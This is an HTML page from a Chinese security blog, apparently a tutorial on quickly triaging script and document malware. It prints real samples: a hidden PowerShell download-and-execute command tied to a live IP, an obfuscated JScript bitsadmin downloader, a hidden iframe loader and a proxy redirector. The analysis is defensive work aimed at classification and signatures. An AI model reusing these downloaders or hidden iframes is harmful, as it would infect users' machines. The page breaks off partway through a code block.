@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>恶意程序快速分析—脚本类和文档类 |  Rain&#39;s Blog</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-恶意程序快速分析—脚本类和文档类"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  恶意程序快速分析—脚本类和文档类
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2024/01/22/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%BF%AB%E9%80%9F%E5%88%86%E6%9E%90%E2%80%94%E8%84%9A%E6%9C%AC%E7%B1%BB%E5%92%8C%E6%96%87%E6%A1%A3%E7%B1%BB/" class="article-date">
+  <time datetime="2024-01-22T08:45:17.000Z" itemprop="datePublished">2024-01-22</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/">恶意程序分析</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">2.3k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">9 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="恶意程序快速分析—脚本类和文档类"><a href="#恶意程序快速分析—脚本类和文档类" class="headerlink" title="恶意程序快速分析—脚本类和文档类"></a>恶意程序快速分析—脚本类和文档类</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
+<p>本文主要内容包括分析工具及快速分析技巧，分析脚本类、文档类、PE类恶意程序。因为篇幅过长，PE类恶意程序放至第二篇文章分析。</p>
+<p>一般来说，在不写分析报告以及不做高级查杀研究的情况下，病毒分析师并不需要对样本进行深入分析，只要判断样本黑白、进行归类并提取特征即可。</p>
+</blockquote>
+<span id="more"></span>
+
+<h2 id="一-工具介绍"><a href="#一-工具介绍" class="headerlink" title="一.工具介绍"></a>一.工具介绍</h2><blockquote>
+<p>由于样本文件具有破坏性，因此在分析样本时最好在虚拟机中分析，如下是样本分析基础需要用到的工具。</p>
+</blockquote>
+<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><blockquote>
+<p>本次实验所需要的工具都放在了我的<a target="_blank" rel="noopener" href="https://github.com/SlientRainyDay/Rain_learning/tree/main/week25-28">github仓库</a>中</p>
+</blockquote>
+<p>虚拟机 — vmware下的win10虚拟机(为了便于将目标样本及分析软件复制到虚拟机中，最好安装Vmware Tools，安装方法请自行搜索)<br>文件管理工具 — Total Commander(下文简称TC)<br>文件查看与分析工具 — hiew</p>
+<h3 id="工具使用方法"><a href="#工具使用方法" class="headerlink" title="工具使用方法"></a>工具使用方法</h3><h4 id="Total-Commander"><a href="#Total-Commander" class="headerlink" title="Total Commander"></a>Total Commander</h4><blockquote>
+<p>TC是文件管理工具，可以对文件进行复制、删除及目录创建等工作。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403211536629.png" alt="image-20240321153656604"></p>
+<p>上面的是我仓库里的安装程序，下面的是安装好的TC，</p>
+<p>需要先把Hiew导入TC，打开TC，全选默认的选项即可。然后导入hiew：</p>
+<p>配置→选项→查看&#x2F;编辑→使用外部查看程序导入hiew</p>
+<p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403211540287.png" alt="image-20240321154038259"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403211542073.png" alt="image-20240321154200041"></p>
+<p>更改使用外部查看器的命令为F3</p>
+<p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403211554770.png" alt="image-20240321155441730"></p>
+<p>在如下主界面中，使用Tab键可以实现左右两个窗口的切换，最下面一栏有更详细的每个操作的说明。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403211544899.png" alt="image-20240321154449853"></p>
+<p>从桌面把样本拖入TC即可看到样本目录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403211546071.png" alt="image-20240321154608025"></p>
+<h4 id="Hiew"><a href="#Hiew" class="headerlink" title="Hiew"></a>Hiew</h4><p>hiew默认以文本形式打开，按回车键可以切换模式，识别样本需要切换到16进制模式。</p>
+<p>在TC中选中样本，然后按F3即可使用hiew查看样本。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403211556264.png" alt="image-20240321155613214"></p>
+<p>按回车键可以切换模式(文本 16进制 汇编)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403211556931.png" alt="image-20240321155626880"></p>
+<h2 id="二-恶意程序的快速识别"><a href="#二-恶意程序的快速识别" class="headerlink" title="二.恶意程序的快速识别"></a>二.恶意程序的快速识别</h2><blockquote>
+<p>此处主要快速判断脚本类、文档类、PE类(DLL和EXE)恶意程序。</p>
+<p>一般步骤为恶意程序识别及归类命名。</p>
+</blockquote>
+<h3 id="恶意程序的四段命名法："><a href="#恶意程序的四段命名法：" class="headerlink" title="恶意程序的四段命名法："></a>恶意程序的四段命名法：</h3><p><strong>恶意程序的类型 . 所运行的系统类型 . 恶意程序家族名称 . 变种号</strong></p>
+<blockquote>
+<p> 其中，第一段是恶意程序的类型，比如如果是病毒，就是 Virus，如果是很宽泛意义上的木马，就是Trojan，如果是下载者木马，就是Trojan-Downloader，如果是漏洞利用程序，就是Exploit等等。第二段是所运行的系统类型，如果是 Windows的32位恶意程序，就是Win32，64位的就是Win64等等。第三段是恶意程序的家族名称，这个名字一般由病毒分析师来决定，可能恶意程序的作者也会在自己的病毒木马中给自己取个名字，但是这个名字一般不会被采用，或多或少都会在经过一定的修改后在使用。最后的变种号则是用于标识当前样本是这个家族的第几号样本，比如最先发现的就是a，之后的变种就是b，依此类推，一直到z。然后接下来就是aa、ab等等。比如对于这个恶意程序来说：</p>
+<p><strong>Trojan.Win32.Setiri.b</strong></p>
+<p>​    它的意思是，这是一个木马程序（Trojan），运行在 Windows的32位平台（Win32），家族名称是Setiri，是这个家族中的第二个样本（b）。再比如这个程序：</p>
+<p><strong>not-a-virus:Adware.Win32.Agent.z</strong></p>
+<p>​    这个程序的名称以not-a-virus作为开头，说明它并不是传统意义上的恶意程序，介于干净的程序和恶意程序之间的地带，这类程序主要分为广告程序、黑客工具等。</p>
+<p>以上内容复制自看雪《文档类恶意程序的快速分析技巧》</p>
+</blockquote>
+<h3 id="1-脚本类恶意程序的快速分析"><a href="#1-脚本类恶意程序的快速分析" class="headerlink" title="1.脚本类恶意程序的快速分析"></a>1.脚本类恶意程序的快速分析</h3><blockquote>
+<p>本次实验分析恶意程序放在了<a target="_blank" rel="noopener" href="https://github.com/SlientRainyDay/Rain_learning/tree/main/week25-28">github 天问之路的week25-28</a>中</p>
+</blockquote>
+<h4 id="1-0cddd8c2084adb75689b5855a70cc4a8"><a href="#1-0cddd8c2084adb75689b5855a70cc4a8" class="headerlink" title="(1) 0cddd8c2084adb75689b5855a70cc4a8"></a><strong>(1) 0cddd8c2084adb75689b5855a70cc4a8</strong></h4><p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403211812135.png" alt="image-20240321181218085"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-noe</span> <span class="literal">-nol</span> <span class="literal">-nop</span> <span class="literal">-noni</span> <span class="literal">-w</span> <span class="keyword">Hidden</span> <span class="literal">-ex</span> Bypass <span class="literal">-c</span> (<span class="built_in">New-Object</span> System.Net.WebClient).DownloadFile(<span class="string">&#x27;http://188.120.250.154/7766.exe&#x27;</span>, <span class="string">&#x27;%Temp%\EUKYZG.pif&#x27;</span>);(<span class="built_in">New-Object</span> <span class="literal">-com</span> Shell.Application).ShellExecute(<span class="string">&#x27;%Temp%\EUKYZG.pif&#x27;</span>);   </span><br></pre></td></tr></table></figure>
+
+<p>该行命令大概就是以隐藏窗口形式启动powershell，然后从指定网址下载<code>7766.exe</code>文件修改名称并执行。下面是命令的各部分详细解释：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe: 这是启动 PowerShell 解释器的命令。</span><br><span class="line"></span><br><span class="line">-noe -nol -nop -noni: 这些是用来启动 PowerShell 时的参数，它们的含义如下：</span><br><span class="line">-noe: 不加载 PowerShell 的 profile（配置文件）。</span><br><span class="line">-nol: 不加载 PowerShell 的位置脚本。</span><br><span class="line">-nop: 不加载 PowerShell 的配置文件。</span><br><span class="line">-noni: 不加载 PowerShell 的执行策略。</span><br><span class="line"></span><br><span class="line">-w Hidden: 这个参数将 PowerShell 窗口设置为隐藏，不显示在屏幕上。</span><br><span class="line">-ex Bypass: 这个参数指定了 PowerShell 脚本的执行策略为 Bypass，即绕过所有脚本执行策略限制。</span><br><span class="line">-c: 这个参数表示后面跟着要执行的命令。</span><br><span class="line"></span><br><span class="line">接下来是具体的要执行的命令：</span><br><span class="line">(New-Object System.Net.WebClient).DownloadFile(&#x27;http://188.120.250.154/7766.exe&#x27;, &#x27;%Temp%\EUKYZG.pif&#x27;): 这段命令使用 .NET Framework 中的 WebClient 对象来从指定的 URL 下载名为 &quot;7766.exe&quot; 的文件，并将其保存到用户的临时目录下，并将其命名为 &quot;EUKYZG.pif&quot;。</span><br><span class="line"></span><br><span class="line">(New-Object -com Shell.Application).ShellExecute(&#x27;%Temp%\EUKYZG.pif&#x27;): 这段命令使用 COM 对象的 Shell.Application 接口来执行刚才下载的 &quot;EUKYZG.pif&quot; 文件。</span><br><span class="line"></span><br><span class="line">总的来说，这段命令的作用是从远程服务器下载一个可执行文件并在用户的计算机上执行它。</span><br></pre></td></tr></table></figure>
+
+<p>正常程序一般是不会<strong>隐藏powershell执行</strong>、<strong>下载并修改文件后缀执行</strong>的，因此可以初步判定为该程序为恶意程序。但是为了严谨起见，还应详细分析下载下来的程序<code>7766.exe</code>，确认是恶意文件后，应将该网站及下载下来的文件拉黑。</p>
+<p>然后给恶意程序归类：采用的是四段命名法。第一段是这个恶意程序的类型，我们发现它是一个下载者程序，所以可以起名为Trojan-Downloader。第二段是这个程序的类型，它属于Powershell。第三段是这个程序的家族名称，这里起名为Agent即可。第四段是这个程序的编号，我习惯以字母进行排序表示，由于这是第一个样本，因此编号为a&#x2F;1。于是，完整的名称是：Trojan-Downloader. Powershell. Agent.a。于是这个样本就分析并归类完成了。</p>
+<h4 id="2-44dcace0cfa9c0f6be1965841bc11410"><a href="#2-44dcace0cfa9c0f6be1965841bc11410" class="headerlink" title="(2)  44dcace0cfa9c0f6be1965841bc11410"></a>(2)  44dcace0cfa9c0f6be1965841bc11410</h4><p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403211839570.png" alt="image-20240321183955531"></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> lildz = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;shell.application&quot;</span>);  </span><br><span class="line"><span class="keyword">var</span> am = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>( <span class="number">99</span>,<span class="number">109</span>,<span class="number">100</span>,<span class="number">46</span>,<span class="number">101</span>)    </span><br><span class="line"><span class="keyword">var</span> kk = <span class="string">&quot; h^t^tp://www.sinakhat^ibi.c^om/121016.e^xe %appdata%\keos.exe     &amp;start %appdata%\keos.exe&quot;</span>   </span><br><span class="line">lildz.<span class="property">ShellExecute</span> (am+<span class="string">&quot;xe&quot;</span>,<span class="string">&quot; /c bitsadmin   /tr^an^sfer my^job /do^wnload /prio^rity hi^gh&quot;</span>+kk, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;open&#x27;</span>,<span class="number">0</span>);   </span><br></pre></td></tr></table></figure>
+
+<p>首先由变量声明符号var就可以知道它是一个JavaScript脚本，接下来在第三行可以发现，这里出现了一个网址，但是奇怪的是，这个网址里面的http、com以及exe等几个字符都被尖角号给隔开了，包括第四行也有类似的情况，而这种写法在正常的程序里面是不可能出现的，所以就可以直接将这个程序判定为有问题的程序了。</p>
+<p>下面是这段程序的详细解释</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var lildz = new ActiveXObject(&quot;shell.application&quot;);：这行代码创建了一个 shell.application 对象，用于执行系统级操作。</span><br><span class="line"></span><br><span class="line">var am = String.fromCharCode( 99,109,100,46,101)：这行代码通过 ASCII 值将一串数字转换为字符，最终得到字符串 &quot;cmd.e&quot;。</span><br><span class="line"></span><br><span class="line">var kk = &quot; h^t^tp://www.sinakhat^ibi.c^om/121016.e^xe %appdata%\keos.exe &amp;start %appdata%\keos.exe&quot;：这里定义了一个包含恶意网址和文件路径的字符串。</span><br><span class="line"></span><br><span class="line">lildz.ShellExecute(am+&quot;xe&quot;,&quot; /c bitsadmin /trans myjob /download /priority high&quot;+kk, &#x27;&#x27;, &#x27;open&#x27;,0);：最终这行代码使用 ShellExecute 方法执行一些操作，其中包括打开 cmd.exe 并下载文件等操作。</span><br></pre></td></tr></table></figure>
+
+<p>根据命名原则，将其命名为Trojan-Downloader. JS. Agent.a。</p>
+<p><strong>如果想要提取传统的特征，那么可以在http、com或者exe的位置进行提取，因为正常的程序不可能将这些字符分开来写。</strong></p>
+<h4 id="3-84f1fa3c698915b91257706d1e4e3f0e"><a href="#3-84f1fa3c698915b91257706d1e4e3f0e" class="headerlink" title="(3) 84f1fa3c698915b91257706d1e4e3f0e"></a>(3) 84f1fa3c698915b91257706d1e4e3f0e</h4><p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403211845196.png" alt="image-20240321184551143"></p>
+<p>由echo off可知该程序是一段BAT批处理程序，但是后面全都特别乱，因此可以判定该程序是经过混淆的(这是恶意程序常用的混淆手段)，正常程序是不可能这样写的，因此可以判定为恶意程序。可以将这个样本归类并命名为：Trojan.BAT.Agent.a。</p>
+<p>如果要提特征的话，那么提在这些乱码的位置也就可以了，正常的程序里面是不会出现这些的。</p>
+<h4 id="4-9b2293323610ccb2af33f977cb21f45c"><a href="#4-9b2293323610ccb2af33f977cb21f45c" class="headerlink" title="(4) 9b2293323610ccb2af33f977cb21f45c"></a>(4) 9b2293323610ccb2af33f977cb21f45c</h4><p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403211848891.png" alt="image-20240321184826846"></p>
+<p>原理同(3)，归为恶意程序。</p>
+<p>将其归类并命名为：Trojan.JS.Agent.a。</p>
+<h4 id="5-b5b98837ede4701a98f1467ab53160fb"><a href="#5-b5b98837ede4701a98f1467ab53160fb" class="headerlink" title="(5) b5b98837ede4701a98f1467ab53160fb"></a>(5) b5b98837ede4701a98f1467ab53160fb</h4><p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403211849164.png" alt="image-20240321184921133"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function FindProxyForURL(url, host) &#123;   </span><br><span class="line">        if (shExpMatch(host, &quot;www.google.*&quot;)) return &quot;PROXY 127.0.0.1:8080&quot;;  </span><br><span class="line">        if (shExpMatch(host, &quot;www.bing.com&quot;)) return &quot;PROXY 127.0.0.1:8080&quot;;  </span><br><span class="line">        return &quot;DIRECT&quot;;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在访问以”<a target="_blank" rel="noopener" href="http://www.google."开头的网址或者"[www.bing.com](http://www.bing.com/)"时，用户的请求会被重定向到代理服务器"127.0.0.1:8080"，而不是直接连接到目标网站。如果代理服务器没有相应的服务运行，那么用户的访问将会失败，从而阻止了用户的正常访问。因此被判定为恶意程序。">www.google.&quot;开头的网址或者&quot;[www.bing.com](http://www.bing.com/)&quot;时，用户的请求会被重定向到代理服务器&quot;127.0.0.1:8080&quot;，而不是直接连接到目标网站。如果代理服务器没有相应的服务运行，那么用户的访问将会失败，从而阻止了用户的正常访问。因此被判定为恶意程序。</a></p>
+<p>将其归类并命名为：Trojan.JS.Redirector.a。</p>
+<h4 id="6-bc70dba947cd5df9fd750353da3faed7"><a href="#6-bc70dba947cd5df9fd750353da3faed7" class="headerlink" title="(6) bc70dba947cd5df9fd750353da3faed7"></a>(6) bc70dba947cd5df9fd750353da3faed7</h4><p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403211852449.png" alt="image-20240321185222392"></p>
+<p>直接拉黑，原理同上。</p>
+<p>将其归类并命名为：Trojan.VBS.Agent.a。</p>
+<h4 id="7-dbfcc7ffadee586e24f8247387b10d6e"><a href="#7-dbfcc7ffadee586e24f8247387b10d6e" class="headerlink" title="(7) dbfcc7ffadee586e24f8247387b10d6e"></a>(7) dbfcc7ffadee586e24f8247387b10d6e</h4><p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403211852998.png" alt="image-20240321185253956"></p>
+<p>首先由var可知它是一个JavaScript文件，接下来由return后面的编码形式（ASCII码）以及后面的一些乱码可知，它也是一个有问题的程序。</p>
+<p>特征提取在乱码的位置即可。</p>
+<p>可以将其归类并命名为：Trojan.JS.Agent.b。</p>
+<h4 id="8-dee2decebaf53fead3714cfa6e862378"><a href="#8-dee2decebaf53fead3714cfa6e862378" class="headerlink" title="(8) dee2decebaf53fead3714cfa6e862378"></a>(8) dee2decebaf53fead3714cfa6e862378</h4><p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403211854001.png" alt="image-20240321185420950"></p>
+<p>乱码多，原理同(7)。</p>
+<p>可以将其归类并命名为：Trojan.JS.Agent.c。</p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>只要我们看到目标样本的代码写得非常晦涩难懂，那么它十有八九是恶意程序了。因为这是恶意程序经常使用的躲避杀软查杀的混淆方式。事实上，利用传统的特征码查杀的方式来对抗这类脚本木马的效果并不好，因此必须要使用诸如启发或者机器学习的方式来对抗这一批样本。</p>
+<h3 id="2-文档类恶意程序的快速分析"><a href="#2-文档类恶意程序的快速分析" class="headerlink" title="2.文档类恶意程序的快速分析"></a>2.文档类恶意程序的快速分析</h3><blockquote>
+<p>本次实验分析样本放在了<a target="_blank" rel="noopener" href="https://github.com/SlientRainyDay/Rain_learning/tree/main/week33-34">github 天问之路的week33-34中</a></p>
+</blockquote>
+<h4 id="1-0ca5700d367fc48a3de7b32a4042aa9e"><a href="#1-0ca5700d367fc48a3de7b32a4042aa9e" class="headerlink" title="(1) 0ca5700d367fc48a3de7b32a4042aa9e"></a>(1) 0ca5700d367fc48a3de7b32a4042aa9e</h4><p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403221500127.png" alt="image-20240322150029056"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTA 应用程序在用户计算机上作为本地程序运行，具有更多的系统权限和能力，相较于普通的网页应用程序，它可以更接近传统的桌面应用程序的功能和外观。</span><br><span class="line"></span><br><span class="line">当使用 hta:application 标签时，可以设置不同的属性来控制 HTML 应用程序的行为。在这个例子中，通过设置 windowstate 属性为 minimize，指定了应用程序在打开时以最小化状态展示窗口。</span><br><span class="line"></span><br><span class="line">具体来说，windowstate 属性有以下几种可能的取值：</span><br><span class="line">normal：默认值，表示应用程序以正常大小打开。</span><br><span class="line">maximize：表示应用程序以最大化的形式打开。</span><br><span class="line">minimize：表示应用程序以最小化的形式打开。</span><br><span class="line"></span><br><span class="line">通过设置不同的 windowstate 值，开发者可以控制应用程序在启动时窗口的状态，从而提供更灵活的用户体验。在这种情况下，窗口将以最小化状态打开，用户可以通过最小化按钮或其他方式将其恢复到正常大小或最大化。</span><br></pre></td></tr></table></figure>
+
+<p>第一行代码比较清晰明了了，就是指定应用程序在打开时以最小化状态。后面部分大部分为乱码，可初步判断为恶意程序。提取特征在乱码部分提取。</p>
+<p>为了进一步判断恶意程序的类别，可以将程序后缀改为hta，打开看一下。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403221505130.png" alt="image-20240322150556060"></p>
+<p>是Spora勒索程序，由于这个勒索程序家族很出名也很庞大，因此我们不妨就直接采用这个名字作为家族的名称，可将这个恶意程序归类为：Trojan-Ransom.HTA.Spora.a。</p>
+<h4 id="2-57651da2b0025c3fc4a12ef5c4a82603"><a href="#2-57651da2b0025c3fc4a12ef5c4a82603" class="headerlink" title="(2) 57651da2b0025c3fc4a12ef5c4a82603"></a>(2) 57651da2b0025c3fc4a12ef5c4a82603</h4><p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403221509836.png" alt="image-20240322150916789"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">&quot;#FFFFFF&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://u7z.ru:8080/index.php&quot;</span> <span class="attr">width</span>=<span class="string">175</span> <span class="attr">height</span>=<span class="string">171</span> <span class="attr">style</span>=<span class="string">&quot;visibility: hidden&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;       </span></span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">这段代码的详细解释如下：</span><br><span class="line">- &lt;html&gt;: 这是 HTML 页面的根元素，表示文档的开始。</span><br><span class="line">- &lt;body bgcolor=&quot;#FFFFFF&quot;&gt;: 这是 body 标签，用于包裹页面的主要内容。在这里，设置了页面的背景颜色为白色（#FFFFFF）。</span><br><span class="line">- &lt;iframe src=&quot;http://u7z.ru:8080/index.php&quot; width=175 height=171 style=&quot;visibility: hidden&quot;&gt;`: 这是一个 iframe 标签，用于嵌入另一个页面。具体属性解释如下：</span><br><span class="line">- src=&quot;http://u7z.ru:8080/index.php&quot;: 指定了嵌入页面的来源，即&quot;http://u7z.ru:8080/index.php&quot;。</span><br><span class="line">- width=175 height=171: 设置了 iframe 的宽度为 175 像素，高度为 171 像素。</span><br><span class="line">- style=&quot;visibility: hidden&quot;: 设置了样式，将 iframe 设置为隐藏，即在页面中不可见。</span><br><span class="line"></span><br><span class="line">这段代码的作用是在页面中嵌入来自&quot;http://u7z.ru:8080/index.php&quot;的网页，并将该嵌入页面的显示设置为隐藏状态，用户在浏览该页面时看不到该嵌入内容。</span><br></pre></td></tr></table></figure>
+
+<p>一般程序不会设置为隐藏状态，因此可以判定为是恶意程序。</p>
+<p>一般来说，这种iframe类的程序，要么是采用visibility:hidden的方式达到隐藏访问的目的，要么是采用将窗口大小都设置为0的方式实现，即将width和height全都设置为0，那么也能够达到相同的目的。</p>
+<p>将这个程序归类为：Trojan.HTML.iframe.a。</p>
+<h4 id="3-8d85bb0a33709ff595c9d56c376b8e65"><a href="#3-8d85bb0a33709ff595c9d56c376b8e65" class="headerlink" title="(3) 8d85bb0a33709ff595c9d56c376b8e65"></a>(3) 8d85bb0a33709ff595c9d56c376b8e65</h4><p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403221537973.png" alt="image-20240322153713908"></p>
+<p>该段程序基本全是乱码，只能从开头发现一个PDF-1.4，那不妨将该文件改为pdf格式打开看一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403221541245.png" alt="image-20240322154138192"></p>
+<p>打开后是一个链接，正常pdf一般是不会单独有一个链接的，因此可以猜测为引导性的钓鱼链接。</p>
+<p>一般来说，这种网站以钓鱼类的居多。当然了，严谨起见是要仔细分析一下这个网站的，但其实分析至此，我们就基本可以判定这个PDF文件是恶意的了。可以将其归类为：Trojan.PDF.Phish.a。</p>
+<h4 id="4-8db7e7186ce697c6e86d67df8eca8268"><a href="#4-8db7e7186ce697c6e86d67df8eca8268" class="headerlink" title="(4) 8db7e7186ce697c6e86d67df8eca8268"></a>(4) 8db7e7186ce697c6e86d67df8eca8268</h4><p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403221544486.png" alt="image-20240322154436427"></p>
+<p>html格式，正常程序不会要求输入邮箱密码的。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403221546386.png" alt="image-20240322154606340"></p>
+<p>因此可以判定为恶意程序。</p>
+<p>可以将该程序改为html后缀看一下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403221547781.png" alt="image-20240322154746710"></p>
+<p>因此可以判定为该程序是一个模仿Excel的钓鱼程序。</p>
+<p>可以将其归类为：Trojan.HTML.Phish.a。</p>
+<h4 id="5-96ff8557edf7660fcde786639fa46c74"><a href="#5-96ff8557edf7660fcde786639fa46c74" class="headerlink" title="(5) 96ff8557edf7660fcde786639fa46c74"></a>(5) 96ff8557edf7660fcde786639fa46c74</h4><p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403221600672.png" alt="image-20240322160056609"></p>
+<p>代码整理后如下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xdp:xdp</span> <span class="attr">xmlns:xdp</span>=<span class="string">&quot;http://ns.adobe.com/xdp/&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">config</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.xfa.org/schema/xci/1.0/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">present</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">pdf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.65<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interactive</span>&gt;</span>1<span class="tag">&lt;/<span class="name">interactive</span>&gt;</span></span><br><span class="line">        